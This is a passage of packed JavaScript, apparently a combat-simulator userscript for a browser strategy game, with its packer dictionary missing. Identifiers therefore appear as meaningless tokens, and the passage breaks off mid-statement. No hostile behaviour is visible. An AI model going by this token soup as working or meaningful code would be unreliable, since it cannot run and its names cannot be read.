a=14.17.1a.2Q;a.1k()===14.17.1a.2S.1k()&&a.1k()===14.17.1a.2R.1k()&&14.17.1a.3A.1r(a.1k());14.7j("fj",!a.1k());a.1k()?(a.2X(0.75),a.3Q("<1t>"+d("3x 5z")+"</1t>")):(a.2X(1),a.3Q("<1t>"+d("2P 5z")+"</1t>"))},14);14.17.1a.2R=19 qx.ui.1w.5N("","3S/2Z/qQ.1J");14.17.1a.2R.1s({1G:44,2e:40,1T:"1X-1R-1W",1S:"<1t>"+d("2P 4m")+"</1t>"});14.17.1a.2R.1o("5j",1c(){1d a=14.17.1a.2R;a.1k()===14.17.1a.2S.1k()&&a.1k()===14.17.1a.2Q.1k()&&14.17.1a.3A.1r(a.1k());14.7j("fp",!a.1k());a.1k()?(a.2X(0.75),a.3Q("<1t>"+d("3x 4m")+"</1t>")):(a.2X(1),a.3Q("<1t>"+d("2P 4m")+"</1t>"))},14);14.17.1a.5S=19 qx.ui.1w.1U("","2o:2G/1J;2A,qJ/7Q/qI+qD/qC+qB+qE/qF/4+qH+qG/qR+qS+r3+r2/r4+r5/r7/r6+r1/r0/qV+qU/qT+qW+qX/qZ/qY/u1/i0+ha+hc+h9+h7/hk+hm+/hj+hg/hh/h4+/h3/gP+gL+h1+gZ/C/gY/gV/gX+hn/hR/hS+hM/n+hT+hU/hW+hX+hK/+hJ/hu+hw+ht+hs+hG++hH+hI/hF//hD/hC+i2/g1/i/g0+fZ+fX+fY/g4/g9+g7/ga/fN/fL/fU+fS/fV++fO=");14.17.1a.5S.1s({1G:44,2e:40,1T:"1X-1R-1W",1S:"<1t>"+d("7p 72")+"</1t>"});14.17.1a.5S.1o("1H",14.eB,14);14.17.1a.5W=19 qx.ui.1w.1U("",c);14.17.1a.5W.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("7o 87")+"</1t>"});14.17.1a.5W.1o("1H",1c(){14.9Q("f9")},14);14.17.1a.5P=19 qx.ui.1w.1U("",e);14.17.1a.5P.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("7o dO")+"</1t>"});14.17.1a.5P.1o("1H",1c(){14.9Q("fs")},14);14.17.1a.3E=19 qx.ui.1w.5N("","3S/2Z/gJ.1J");14.17.1a.3E.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("3x 3b 4z")+"</1t>"});14.17.1a.3E.1o("7k",14.fm,14);14.17.1a.3E.1o("5j",1c(){1d a=14.17.1a.3E;a.1k()?a.3Q("<1t>"+d("3x 3b 4z")+"</1t>"):a.3Q("<1t>"+d("2P 3b 4z")+"</1t>")},14);14.17.1a.3n=19 qx.ui.1w.1U("",h);14.17.1a.3n.1o("1H",14.aU,14);14.17.1a.3n.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("8X 2J")+"</1t>"});14.17.1a.61=19 qx.ui.1w.1U("","2o:2G/1J;2A,gb+fe+gB+/q/gF/gD/gE+gt/gs++gf/gd/++go+gm+gn+ge+gg//gh/gI/gH/gw+gu+fQ+/fR+fM+fP+kK+jT/jU/jR+jQ+jN+jO/jV+jW+i3+k4+k0+vx/jX+jY+jZ+jM+jL/jy//jA+jx+jw/js/jt/ju+jv+jC/jJ/jK+jH/jG/jD/jE=");14.17.1a.61.1o("1H",14.9q,14);14.17.1a.61.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("5K 2J 59")+"</1t>"});14.17.1a.6q=19 qx.ui.1w.1U("","2o:2G/1J;2A,k5+k6+kx/kz/N//kw+ks/ku+c+kA/kB+kH+kI+kG+kr/kq+BG/kd+F+ke+kf/kc+kb/k8+k9+ka+kg/+kh+kn/ko/km+kl/ki/kj+jq/iy=");14.17.1a.6q.1o("1H",1c(){1j.1l("8y")},14);14.17.1a.6q.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("8y")+"</1t>"});14.17.1a.5X=19 qx.ui.1w.1U("","2o:2G/1J;2A,iz/iA+ix/iw/is+iu+iv/iB+iI/iJ/iH+iG+iD+iE+iF+ir+ib/i9/i5+i7+im+io+il/ii/iL/je/jf+jc+j8+jh/E4/jp/l+jm/jl+ji/jj/j6=");14.17.1a.5X.1o("1H",1c(){1j.1l("8x")},14);14.17.1a.5X.1s({1G:44,2e:40,3y:0,2O:"2Y",1T:"1X-1R-1W",1S:"<1t>"+d("<1t>8x")+"</1t>"});14.17.1a.1f=(19 qx.ui.1w.1U).1s({1G:44,2e:40,1T:"1X-1R-1W",2Y:"3S/2Z/8R.1J",1S:"<1t>"+d("4Z")+"</1t>"});14.17.1a.1f.1o("1H",14.8M,14);14.1I.1b(14.17.1a.5P,{1M:10,2f:10});14.1I.1b(14.17.1a.5W,{1M:10,2f:60});14.1I.1b(14.17.1a.3A,{1M:10,2f:aK});14.1I.1b(14.17.1a.2S,{1M:10,2f:j4});14.1I.1b(14.17.1a.2Q,{1M:10,2f:j2});14.1I.1b(14.17.1a.2R,{1M:10,2f:iY});14.1I.1b(14.17.1a.3n,{1M:10,2f:iZ});14.1I.1b(14.17.1a.1f,{1M:10,26:10});14.1I.1b(14.17.1a.3E,{1M:10,26:60});14.1I.1b(14.17.1a.61,{1M:10,26:9J});14.1I.1b(14.17.1a.5X,{1M:10,26:j1});14.1I.1b(14.17.1a.6q,{1M:10,26:jn});14.1I.1b(14.17.1a.5S,{1M:10,26:j9});14.2i&&14.1N.2M(14.2i);if(14.1f.3G.1k())1d k=64,m=g,l=5,y=0,I=30,p=15,q=15;3q k=90,m=f,l=15,y=16,I=46,q=p=30;14.2i=19 qx.ui.2t.2s;14.2i.2c(19 qx.ui.1B.8W);14.2i.8V(aa);14.2i.4N(k);14.2i.1s({7X:(19 qx.ui.88.8b).1s({bp:m})});14.1f.3G.1k()?14.1N.1b(14.2i,{1M:0,26:53}):14.1N.1b(14.2i,{1M:0,2f:0});14.17.1a.2k=19 qx.ui.1w.1U(d("bZ"));14.17.1a.2k.1s({1G:58,1T:"1X-1R-1W",1S:d("9o 4A 3W")});14.17.1a.2k.1o("1H",14.eU,14);14.17.1a.5L=19 qx.ui.1w.1U(d("2J"));14.17.1a.5L.1s({1G:58,1T:"1X-1R-1W",1S:d("5K 7E cT")});14.17.1a.5L.1o("1H",14.9q,14);14.17.4V=19 qx.ui.1w.1U("<");14.17.4V.1s({1G:30,1T:"1X-1R-1W",1S:d("4h 2r 2f")});14.17.4V.1o("1H",1c(){14.62("l")},14);14.17.4Y=19 qx.ui.1w.1U(">");14.17.4Y.1s({1G:30,1T:"1X-1R-1W",1S:d("4h 2r 26")});14.17.4Y.1o("1H",1c(){14.62("r")},14);14.17.55=19 qx.ui.1w.1U("^");14.17.55.1s({1G:30,1T:"1X-1R-1W",1S:d("4h 2r up")});14.17.55.1o("1H",1c(){14.62("u")},14);14.17.4R=19 qx.ui.1w.1U("v");14.17.4R.1s({1G:30,1T:"1X-1R-1W",1S:d("4h 2r cC")});14.17.4R.1o("1H",1c(){14.62("d")},14);1d s=1C.5y;if(s=s?1Z.2F(1C.5y):!0)14.2i.1b(14.17.55,{1M:16,26:p}),14.2i.1b(14.17.4V,{1M:35,26:I}),14.2i.1b(14.17.4Y,{1M:35,26:y}),14.2i.1b(14.17.4R,{1M:54,26:q});14.2i.1b(14.17.1a.5L,{1M:77,2f:l});14.2i.1b(14.17.1a.2k,{1M:1A,2f:l})}1u(t){1j.1l(t)}},dy:1c(){1v{1d b=14.1O.2z().3m(),a=14.1O.2z().4x();if(18!=a){1d c=a.2q(),e=b.c8().kJ(c);14.1Y.bm=e;14.1Y.2p=e.g2().l}}1u(d){1j.1l(d)}},bt:1c(){1C.8E=1Z.3g(14.1f.43.1k())},bB:1c(){1C.5y=1Z.3g(14.1f.4i.1k());14.1f.4i.1k()?14.6I():(14.2i.2M(14.17.55),14.2i.2M(14.17.4V),14.2i.2M(14.17.4Y),14.2i.2M(14.17.4R))},bA:1c(){1v{1C.6b=1Z.3g(14.1f.4t.1k()),14.1f.4t.1k()?14.1N.1b(14.17.1a.3F,{1M:b1,26:9}):14.1N.2M(14.17.1a.3F)}1u(b){1j.1l(b)}},aZ:1c(){1v{1C.6d=1Z.3g(14.1f.4q.1k()),14.1f.4q.1k()?14.1N.1b(14.17.1a.1D,{1M:16,26:9}):14.1N.2M(14.17.1a.1D)}1u(b){1j.1l(b)}},9q:1c(){14.2g.5x()?14.2g.7n():14.2g.5O()},8M:1c(){14.2V.5x()?14.2V.7n():14.2V.5O()},9s:1c(){24(1d b=14.6v(),a=!1,c=0;c<b.2B;c++)if(b[c].e){a=!0;22}1j.1l(a);2v a?!1:!0},aU:1c(){1v{1d b=14.1O.2z().3m();!14.9s()&&0<b.9N()&&(14.dd(),1e.3Y.5V.2L().bu(),14.17.1a.3n.32(!1),14.17.1a.2k.32(!1),14.1i.4b.4N(9J),14.57=10,14.7L=!0)}1u(a){1j.1l(a)}},bU:1c(){1v{1d b=2d.2m.2j();b.57-=1;b.1i.4b.4N(b.1i.4b.aW()-11);0>=b.57&&(6z(b.9z),b.17.1a.3n.32(!0),b.6s&&(b.1N.2M(b.5u),b.6s=!1))}1u(a){1j.1l(a)}},8L:1c(){1v{0!=14.1i.4b.aW()&&!14.6s&&(14.5u=19 qx.ui.1p.6r("h0://gN-a.gM.gR/hf/kF/2o/h8.1J"),14.5u.1s({1S:d("3W bv be bx on by bi bh 1g!")}),14.1f.3G.1k()?14.1N.1b(14.5u,{1M:f5,26:67}):14.1N.1b(14.5u,{1M:f5,2f:27}),14.6s=!0)}1u(b){1j.1l(b)}},dC:1c(){1v{1d b={1:0,2:0,3:0,6:0,7:0},a=1e.3Y.5V.2L().gU(),c;24(c in a)b[a[c].92]+=a[c].fy;14.1g.2W.6G.6X(14.5g(b[1]));14.1g.2W.6C.6X(14.5g(b[2]));14.1g.2W.6D.6X(14.5g(b[3]));14.1g.2W.5R.6X(14.5g(b[6]))}1u(e){1j.1l(e)}},5Y:1c(b,a,c,e,d){if(b!=a){b=1e.3Y.2n.8S(e,d,0<a?(b-a)/16/c:b/16/c);24(c=a=0;c<b.2B;c++)37(e=b[c],eu(e.92)){1x 1e.1z.3t.g6:1x 1e.1z.3t.8Z:1x 1e.1z.3t.8J:1x 1e.1z.3t.8K:a+=e.fy}2v a}2v 0},7q:1c(b,a,c){1d e=["89","fd","fw","fc"],d=e[0];0<=c&&(a=1A-a);99.99<a?d=e[3]:50<a?d=e[2]:0<a&&(d=e[1]);b.9a(d)},4e:1c(b,a,c){14.7q(b,a,c);a=2N.k3(1A*a)/1A;b.1r(a.5f(2).28())},68:1c(b,a,c,e){e=a.5f(2).28()+" @ "+31.36.2n.4s(e);14.7q(b,a,c);b.1r(e)},ce:1c(){1d b=14,a="",c=0;0===14.1g.1q.1E.3B?(a=d("4H 5l"),c=0):1A>14.1g.1q.1E.1K?(a=d("5l"),c=1):(a=d("4H aB"),c=3);14.1i.1q.5M.1r(a);14.1i.1q.5M.9a(["fw","fd","89","fc"][c]);14.4e(14.1i.1q.1K,14.1g.1q.1K,-1);14.4e(14.1i.1q.2r.1K,14.1g.1q.2r.1K,-1);14.4e(14.1i.1q.1E.1K,14.1g.1q.1E.1K,-1);14.4e(14.1i.1q.1E.3B,14.1g.1q.1E.3B,-1);14.4e(14.1i.1q.1E.47,14.1g.1q.1E.47,-1);14.1Y.4W?14.4e(14.1i.1q.1E.3L,14.1g.1q.1E.3L,-1):(14.1i.1q.1E.3L.1r("--"),14.1i.1q.1E.3L.9a("89"));a=0<14.1g.49?14.1g.49.28():"--";14.1i.49.1r(d("6T 8T ")+a+": ");14.4e(14.1i.1q.1E.4j,14.1g.1q.1E.4j,-1);14.1i.1D.2a.1r(31.36.2n.4s(14.1g.1D.2a));14.1i.2l.2a.1r("CP:"+14.1g.2l.7a+" / F:"+14.1g.2l.5b+"/ C:"+14.1g.2l.8m);14.68(14.1i.2h.1K,14.1g.2h.1K,1,14.1g.1D.1K);14.68(14.1i.2h.2y,14.1g.2h.2y,1,14.1g.1D.2y);14.68(14.1i.2h.2K,14.1g.2h.2K,1,14.1g.1D.2K);14.68(14.1i.2h.2I,14.1g.2h.2I,1,14.1g.1D.2I);3C(1c(){b.1g.42=b.3d.5a().iQ()/4G;b.7q(b.1i.42,b.1g.42/fA,-1);b.1i.42.1r(b.1g.42.5f(2).28())},1)},5g:1c(b){2v 2N.4S(b).28().cI(/\\B(?=(\\d{3})+(?!\\d))/g,",")},dM:1c(){14.1N.2M(14.17.1a.3F);1d b=14;3C(1c(){b.1N.1b(b.17.1a.3F)},iW)},dK:1c(){14.1N.2M(14.17.1a.1D);1d b=14;3C(1c(){b.1N.1b(b.17.1a.1D)},iR)},e2:1c(b,a){1v{14.1Y.7C=2N.8e(1e.1z.iT.j7(1e.1z.jo.jg,a.e0[6].r,a.e0[6].s))}1u(c){1j.1l(c)}},dj:1c(){14.17.1a.3E.1k()&&14.17.1a.3E.7k();14.2g.5x()&&14.2g.7n()},dX:1c(){2C.3Z.7W.iM.2j().33(20);2C.3Z.ij.ik.2j().33(20);2C.3Z.ip.ie.2j().33(20);2C.3Z.i4.i8.2j().33(20);2C.3Z.5R.iq.2j().33(20);2C.3Z.iK.iC.2j().33(20);2C.3Z.kk.kp.2j().33(20)},dl:1c(){1j.1l("df kE");14.4l.5x()&&(14.17.1a.3n.32(!1),14.17.1a.2k.32(!1),14.5p(),14.8u());14.6H()},eS:1c(b,a){14.dh=a;14.17.1a.2k.32(!1);14.17.1a.3n.32(!1);1v{37(14.dj(),a){1x 1e.1P.4z.5V:14.5n=qx.3h.3w.3v().4v().8d();14.5p();22;1x 1e.1P.4z.kt:14.5n=qx.3h.3w.3v().4v().8d(),14.5p()}}1u(c){1j.1l(c)}},8u:1c(){1v{14.17.1a.2S.1k(!0)&&14.17.1a.2S.1r(!1),14.17.1a.2Q.1k(!0)&&14.17.1a.2Q.1r(!1),14.17.1a.2R.1k(!0)&&14.17.1a.2R.1r(!1)}1u(b){1j.1l(b)}},5p:1c(){1v{1d b=14;if(14.3d.dk().kv()){if(3C(1c(){1d a=1e.1P.6k.2L().ee();a.ky(0,a.jF()+a.jB()*a.an())},8o),14.aO(),3<14.5n){14.eE();1d a=14.1O.2z().4x();if(18!=a){1d c=14.1O.2z().3m();14.1g.2l.8k=c.jz(a.a2(),a.a5());14.a3();14.dC();14.6R();14.dy();if(18!=14.5Q&&14.5Q!==a.2q()){14.1i.1D.2a.1r(31.36.2n.4s(14.1g.1D.2a));14.1i.2l.2a.1r("CP:"+14.1g.2l.7a+" / F:"+14.1g.2l.5b+"/ C:-");14.8u();1d e=a.gz();14.1Y.4W=e===1e.1z.5c.8N||e===1e.1z.5c.8O;if(14.1Y.4W){1d d=a.gc();1e.79.ej.2L().gj("gk",{id:d},31.36.2n.eh(1e.79.eg,14,14.e2),18)}}14.5Q=a.2q()}}}3q 3C(1c(){b.5p()},cQ)}1u(f){1j.1l(f)}},eE:1c(){14.5n=qx.3h.3w.3v().4v().8d();37(14.5n){1x 1e.1Q.48.ey:1j.1l("!!!\\n 2m bQ\\n!!!\\n 5p, fT 1x ey");22;1x 1e.1Q.48.8I:14.1f.43.1k()&&14.2g.5O();22;1x 1e.1Q.48.g5:14.1f.43.1k()&&14.1V.3k.3H&&14.2g.5O();22;1x 1e.1Q.48.eG:1j.1l("eG");22;1x 1e.1Q.48.eN:1j.1l("eN");22;1x 1e.1Q.48.bS:14.1V.3k.3R&&(1j.1l("hr 1x 10"),14.2g.5O())}},a3:1c(){1v{1d b=14.1O.2z().3m(),a=b.9N(),c=b.hv(),e=c.8i(1e.1Q.8h.4c,!1),d=c.8i(1e.1Q.8h.94,!1),f=c.8i(1e.1Q.8h.93,!1);14.1g.1D.2a=1e.1z.b5.5T(b.b4().aX());14.1g.1D.5Z=14.1O.5q().5r(2N.5Z(e,f,d));14.1g.2l.8j=14.1O.8G().hO();14.1g.2l.7a=2N.4S(14.1g.2l.8j/14.1g.2l.8k);14.1g.2l.5b=2N.4S(14.1g.1D.2a/14.1g.1D.5Z)+1;14.1g.2l.8m=2N.4S(14.1g.1D.2a/14.1g.1D.1K)+1;1A!==a&&(14.1g.2l.5b--,14.1g.2l.5b+="*")}1u(g){1j.1l(g)}},ei:1c(){1v{14.3r.4v().9H(1e.1Q.48.8I,1C.9F,0,0)}1u(b){14.3r.4v().9H(1e.1Q.48.8I,1C.9F,0,0),1j.1l(b)}},aO:1c(){1v{1d b=14.1O.2z(),a=b.4x();if(18!=a){1d c=b.3m();10>=1e.1z.2n.he(a.a2(),a.a5(),c.a2(),c.a5())&&(14.17.1a.2k.32(!0),0>=14.57&&14.17.1a.3n.32(!0))}}1u(e){1j.1l(e)}},eC:1c(){1v{24(;14.3d.5a().jS().jk(!1););14.3d.5a().9r(1)}1u(b){1j.1l(b)}},eU:1c(){1v{if(hd<6p.da()-14.a1){1d b=14.1O.2z().3m();!14.9s()&&0<b.9N()&&(1e.3Y.5V.2L().bu(),14.17.1a.3n.32(!1),14.17.1a.2k.32(!1),14.1i.4b.4N(9J),14.57=10,14.7L=!1)}3q 14.9B(),14.3d.5a().iO(),14.3d.5a().9r(1)}1u(a){1j.1l(a)}},7G:1c(b){14.aR("7G");1v{14.7L||(14.9B(),3C(1c(){1e.1P.6k.2L().5a().9r(1)},1));1d a=0,c=0,e=0,d=0,f=0,g=0,j=0,k=0,m=0,l=0,y=0,p=0,q=0,s=0,t=0,u=0,v=0;14.1g.1q.1E.47=0;14.1g.1q.1E.3B=0;14.1g.1q.1E.3L=0;14.1g.49=0;14.1g.1q.1E.4j=0;14.1g.1D.2y=0;14.1g.1D.2K=0;14.1g.1D.2I=0;14.a1=6p.da();14.9z=9k(14.bU,4G);24(1d x=0;x<b.2B;x++){1d w=b[x].hp,A=w.t,z=1e.hB.hA.2L().hx(A),E=z.pt,F=z.mt,B=w.l,H=w.sh,r=w.h,n=1e.3Y.2n.hV(B,z,!1);37(E){1x 1e.1z.9D.9d:if(14.1Y.4W)1d C=14.1Y.7C,D=1e.1z.2n.cS(B,C),n=2N.4S(16*(n*D/1A))/16;j+=n;k+=r;e+=n;d+=r;22;1x 1e.1z.9D.hY:a+=n;c+=r;37(F){1x 1e.1z.3I.fi:s+=n;m+=r;t+=14.5Y(H,r,n,B,A);22;1x 1e.1z.3I.fa:1x 1e.1z.3I.fH:p+=n;l+=r;v+=14.5Y(H,r,n,B,A);22;1x 1e.1z.3I.4m:1x 1e.1z.3I.fh:q+=n,y+=r,u+=14.5Y(H,r,n,B,A)}22;1x 1e.1z.9D.hN:14.1Y.4W&&(C=14.1Y.7C,D=1e.1z.2n.cS(B,C),n=2N.4S(16*(n*D/1A))/16),f+=n,g+=r,e+=n,d+=r}if(cQ<=A&&gW>=A)14.1g.49=B,14.1g.1q.1E.4j=1A*(r/16/n);3q 37(A){1x hl:1x hb:1x px:14.1g.1q.1E.47=0<H?1A*(r/16/n):0;22;1x Hd:1x Hb:1x H2:14.1g.1q.1E.3B=1A*(r/16/n);22;1x H3:1x Hm:14.1g.1q.1E.3L=1A*(r/16/n)}}14.1g.2h.2y=s?1A*(m/16/s):1A;14.1g.2h.2K=p?1A*(l/16/p):1A;14.1g.2h.2I=q?1A*(y/16/q):1A;14.1g.1q.2r.1K=j?1A*(k/16/j):0;14.1g.1q.1E.1K=1A*(g/16/f);14.1g.1q.1K=1A*(d/16/e);14.1g.2h.1K=c?1A*(c/16/a):0;14.1g.1D.2y=14.1O.5q().5r(t);14.1g.1D.2I=14.1O.5q().5r(u);14.1g.1D.2K=14.1O.5q().5r(v);14.1g.1D.1K=14.1O.5q().5r(2N.5Z(t,u,v));14.a3();14.ce();14.17.1a.2k.32(!0)}1u(G){1j.1l("7G()\\n Gn 5Y()",G)}},9B:1c(){1v{1d b=14.1O.2z().4x();14.1O.2z().3m().c8().Gw(b.2q());1C.9F=b.2q();14.3r.4v().9H(1e.1Q.48.bS,b.2q(),0,0)}1u(a){1j.1l(a)}},J6:1c(){1d b=14.6v(),a=14.6V(),c=14.aH(14.1g);14.4M[0]={f:b,t:a,s:c};1j.1l(14.4M[0])},IR:1c(b){1d a;24(a=0;a<14.4M.2B&&!(14.4M[a].t>b);a++);14.4M=14.4M.4P(0,a)},6R:1c(){1v{if(14.1F.4p.I4(),14.bz(),14.1F.3f)24(1d b in 14.1F.3f){1d a=14.1F.3f[b],c=19 qx.ui.1w.Ie(a.3K,18,a.id);14.1F.4p.1b(c)}}1u(e){1j.1l(e)}},cx:1c(){1v{1d b=14.1F.4p.cu();if(18!=b&&0<b.2B){1d a=b[0].cN();14.1F.3f&&"3V"!==2E 14.1F.3f[a]&&(eq 14.1F.3f[a],14.9M(),14.6R(),14.6H())}}1u(c){1j.1l(c)}},ct:1c(b){1v{1d a=14.1F.4p.cu();if(18!=a&&0<a.2B){1d c="9v"===2E b?a[0].cN():b;14.1F.3f&&"3V"!==2E 14.1F.3f[c]&&14.5t(14.1F.3f[c].1B)}}1u(e){1j.1l(e)}},aP:1c(){1d b=[],a,c;1v{b=14.6v(),a=(19 6p).aN().28(),c=18!==14.1g.1q.1E.3B?14.1F.3K.1k()+" ("+14.1g.1q.1E.3B.5f(0).28()+":"+14.1g.1q.1E.47.5f(0).28()+":"+14.1g.1q.2r.1K.5f(0).28()+")":14.1F.3K.1k()+" (??:??:??)",14.1F.3f[a]={id:a,3K:c,1B:b},14.9M(),14.6R(),14.6H(),14.1F.3K.1r("")}1u(e){1j.1l(e)}2v a},bz:1c(){1v{if(18!=14.1O.2z().4x()){1d b=14.1O.2z().4x().2q(),a=14.1O.2z().3m().2q();14.1F.3l.4B(b)||(14.1F.3l[b]={});14.1F.3l[b].4B(a)||(14.1F.3l[b][a]={});14.1F.3f=14.1F.3l[b][a]}}1u(c){1j.1l(c)}},aY:1c(){1v{1d b=1C.bc;14.1F.3l=b?1Z.2F(b):{}}1u(a){1j.1l(a)}},9M:1c(){1v{1C.bc=1Z.3g(14.1F.3l)}1u(b){1j.1l(b)}},5t:1c(b){1v{14.1F.9O=!0;24(1d a=0;a<b.2B;a++)24(1d c=b[a],e=0;e<14.1Y.2p.2B;e++)14.1Y.2p[e].2q()===c.id&&(14.1Y.2p[e].9L(c.x,c.y),Ip 0===c.e?14.1Y.2p[e].4K(!0):14.1Y.2p[e].4K(c.e));14.1F.9O=!1}1u(d){1j.1l(d)}},6v:1c(){1d b=[];1v{24(1d a=0;a<14.1Y.2p.2B;a++){1d c=14.1Y.2p[a],e={};e.x=c.4E();e.y=c.4w();e.id=c.2q();e.e=c.65();b.63(e)}}1u(d){1j.1l(d)}2v b},62:1c(b){1d a=[],c=0,e=0;"u"===b&&(c=-1);"d"===b&&(c=1);"l"===b&&(e=-1);"r"===b&&(e=1);24(b=0;b<14.1Y.2p.2B;b++){1d d=14.1Y.2p[b],f={},g=d.4E()+e;37(g){1x 9:g=0;22;1x-1:g=8}1d j=d.4w()+c;37(j){1x 4:j=0;22;1x-1:j=3}f.x=g;f.y=j;f.id=d.2q();f.e=d.65();a.63(f)}14.5t(a)},9Q:1c(b){1d a=[];1v{24(1d c=0;c<14.1Y.2p.2B;c++){1d e=14.1Y.2p[c],d={},f=e.4E(),g=e.4w();"f9"===b?f=2N.fI(f-8):"fs"===b&&(g=2N.fI(g-3));d.x=f;d.y=g;d.id=e.2q();d.e=e.65();a.63(d)}14.5t(a)}1u(j){1j.1l(j)}},7j:1c(b,a){1d c=[];1v{24(1d e=0;e<14.1Y.2p.2B;e++){1d d=14.1Y.2p[e],f={};37(b){1x"fp":(d.66().mt===1e.1z.3I.4m||d.66().mt===1e.1z.3I.fh)&&d.4K(a);22;1x"2y":d.66().mt===1e.1z.3I.fi&&d.4K(a);22;1x"fj":(d.66().mt===1e.1z.3I.fa||d.66().mt===1e.1z.3I.fH)&&d.4K(a)}f.x=d.4E();f.y=d.4w();f.e=d.65();f.id=d.2q();c.63(f)}14.5t(c)}1u(g){1j.1l(g)}},eB:1c(){1d b=[];1v{24(1d a=0;a<14.1Y.2p.2B;a++){1d c=14.1Y.2p[a],d={};d.x=c.8g().4E();d.y=c.8g().4w();d.id=c.2q();b.63(d)}14.5t(b);14.17.1a.2S.1k(!0)&&14.17.1a.2S.1r(!1);14.17.1a.2Q.1k(!0)&&14.17.1a.2Q.1r(!1);14.17.1a.2R.1k(!0)&&14.17.1a.2R.1r(!1)}1u(h){1j.1l(h)}},8l:1c(b,a){1d c=a.4a[b].E8(!0);c.95=a.6E().ui/1A;c.Ee()},6E:1c(){2v 1Z.2F(1C.er("E5"))},f8:1c(){1v{1e.79.ej.2L().DU("3b",{E2:14.8C,E1:14.fo,E0:4},31.36.2n.eh(1e.79.eg,14,2d.2m.2j().ek),14.fl,!0)}1u(b){1j.1l(b)}},ek:1c(b,a){1v{if(a){1d c=2d.2m.2j();c.1V.4a.em&&("eK"==c.2U[b].eT?c.8l("4O",c):c.8l("4J",c));c.1N.2M(c.2U[b]);eq c.2U[b]}}1u(d){1j.1l(d)}},9f:1c(){24(1d b in 14.2U)14.1N.2M(14.2U[b]);14.2U=[]},9h:1c(){1d b=14;14.78&&CK(b.78);14.78=3C(1c(){b.9m(b)},8o)},9m:1c(b){b=b||14;1d a=b.1O.2z().3m().2q();0<b.2U.2B&&b.9f();24(1d c=b.3d.ee(),d=c.CI(),h=2N.8e(-1*c.CJ()*d)+10,c=2N.8e(c.au()*d),d=0;d<b.1Y.2p.2B;d++){1d f=b.1Y.2p[d];if(1>f.Cu()){1d g=f.8g().CF().d,j,k,m,l;24(l in g)37(l=eu(l),l){1x 1e.1z.3t.fB:j=g[l];22;1x 1e.1z.3t.8Z:k=g[l];m="eK";22;1x 1e.1z.3t.8J:k=g[l];m="CD";22;1x 1e.1z.3t.8K:k=g[l],m="4m"}k=31.36.2n.4s(b.1O.5q().5r(k));j=b.5g(j);b.2U[d]=19 qx.ui.1w.1U("","2o:2G/1J;2A,Df/wD/AP+Dc/Dg/Dh+Dl/Dk+Dj+D0/CZ++D2+D5+D3/D4+Fs/Q+Fr+Fv/Fw++FA/Fx/Fo/Fe/Fc/Fd/+Fh/Fi/Fn/Fm/Fl/Fj+u2+FQ/FW/+FP/FN+3O+EE+En+Ej/Ek+Eo/Ep/Eu/Es/Eq/Er/EJ+F1/F0+EY+EZ+F4/F8/EM/EK/hE+EV/ET/ES///DM+ER+EU+EQ/EP+EL+EN+EO+EW+EX%3D%3D");b.2U[d].1s({7X:(19 qx.ui.88.8b).1s({f3:"F6"}),1G:c,2e:38,2O:"2Y",8w:!1,3y:3,1T:"1X-1R-1W",F3:"EI",1S:"fB: "+j+" / 8q: "+k+" / 92: "+m});b.2U[d].1o("7k",b.f8,{8C:a,fo:f.2q(),fl:d,Et:b});b.2U[d].eT=m;b.1N.1b(b.2U[d],{2f:h+c*f.4E(),1M:7+38*f.4w()})}}},fm:1c(){1v{14.4a.4J||(14.4a.4J=19 fb(2d.4J.d),14.4a.4O=19 fb(2d.4O.d),14.4a.4J.95=14.6E().ui/1A,14.4a.4O.95=14.6E().ui/1A),14.1N.3p().9l(),14.1N.32(!0),14.2i.9l(),14.2g.9l(),14.17.1a.3E.1k()?(14.9m(),14.1N.1o("b7",14.9h,14),14.2w.2O(),14.91(),14.9i=9k(14.91,4G)):(14.9f(),14.1N.EC("b7",14.9h,14),14.2w.5U(),6z(14.9i))}1u(b){1j.1l(b)}},91:1c(){1v{1d b=2d.2m.2j(),a=b.1O.2z().3m(),c=a.5T(1e.1z.3t.8Z),d=a.5T(1e.1z.3t.8J),h=a.5T(1e.1z.3t.8K);b.1g.1D.2a=1e.1z.b5.5T(a.b4().aX());b.1i.2T.2a.1r(31.36.2n.4s(b.1g.1D.2a));b.1i.2T.2y.1r(31.36.2n.4s(c-b.1g.1D.2a));b.1i.2T.2K.1r(31.36.2n.4s(d-b.1g.1D.2a));b.1i.2T.2I.1r(31.36.2n.4s(h-b.1g.1D.2a))}1u(f){1j.1l(f)}},b0:1c(){1v{1d b=2d.2m.2j();6z(b.7s);b.4L=0}1u(a){1j.1l(a)}},6H:1c(){1v{if(14.1f.4g.1k()){1d b=14.1O.2z().3m(),a=b.2q(),c=b.G0(),d=b.G1(),h=14.3d.FS(),f=14.1O.FT().FU()+0.1;37(14.1O.8G().bn()){1x 1e.1z.5c.8N:1d g=1e.1P.8Y.FB;22;1x 1e.1z.5c.8O:g=1e.1P.8Y.Fp}24(b=c-f;b<c+f;b++)24(1d j=d-f;j<d+f;j++){1d k=h.Fy(b*h.au(),j*h.an());if(18!=k&&(k.6m()==1e.1P.6l.6u.6Q||k.6m()==1e.1P.6l.6u.aj||k.6m()==1e.1P.6l.6u.al)&&!(k.6m()==1e.1P.6l.6u.6Q&&k.Fz())&&!(k.6m()==1e.1P.6l.6u.aj&&k.Ei())){k.6U().8U(1e.1P.8Y.aM);1d m=k.2q();if(14.1F.3l.4B(m)&&14.1F.3l[m].4B(a)){1d l=0,p;24(p in 14.1F.3l[m][a])14.1F.3l[m][a].4B(p)&&l++;0<l&&k.6U().8U(g)}}}}}1u(q){1j.1l(q)}},D1:1c(b){2v 19 6p(b)},6V:1c(){2v(19 6p).aN()},dd:1c(){14.8Q=14.6V()},aR:1c(b){b=b||"CY";14.8P=14.6V();1j.1l(14.8P-14.8Q+"ms to D8 "+b)},aH:1c(b){2v 1Z.3g(b)}}});2d.2m.2j().aA();if(Db<=ax){1d F=1e.1Q.3U.2b.4x.28(),t;24(t in 1e.1Q.3U.2b)if(1e.1Q.3U.2b.4B(t)&&"1c"===2E 